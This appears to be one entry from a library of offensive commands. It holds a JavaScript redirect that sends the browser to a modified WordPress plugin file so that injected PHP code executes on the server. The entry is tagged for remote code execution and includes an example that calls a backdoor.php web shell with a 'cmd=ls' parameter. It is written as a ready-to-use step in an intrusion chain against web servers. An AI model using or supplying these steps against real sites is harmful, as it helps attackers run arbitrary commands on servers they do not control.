---
data: 'window.location.href = "http://127.0.0.1:8090/wp-content/plugins/hello.php"'
tags:
  - redirect
  - rce
type: command
executor: javascript
platforms:
  - Web
id: 010fbc6a-711b-4722-bb9e-53c0fce97831
created_at: '2025-12-14T17:23:20.616Z'
updated_at: '2025-12-14T17:23:20.616Z'
verified: false
validated: true
submitted: true
---
# redirect-to-plugin-file

## Command

```javascript
window.location.href = "http://127.0.0.1:8090/wp-content/plugins/hello.php"
```

## Description

This JavaScript command redirects the current window to the modified plugin file URL, causing the server to execute the injected PHP code.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| window.location.href | Sets the new URL | Yes |
| URL | Path to the injected file | Yes |

## Examples

### Basic Usage

```javascript
window.location.href = "http://127.0.0.1:8090/wp-content/plugins/hello.php"
```

### Advanced Usage

```javascript
window.location.href = "http://target.com/wp-content/plugins/backdoor.php?cmd=ls"
```

## Expected Output

Browser navigates to the URL, displaying PHP execution output like phpinfo() page.

## Related

- [[procedures/Execute-Injected-PHP-for-RCE]]
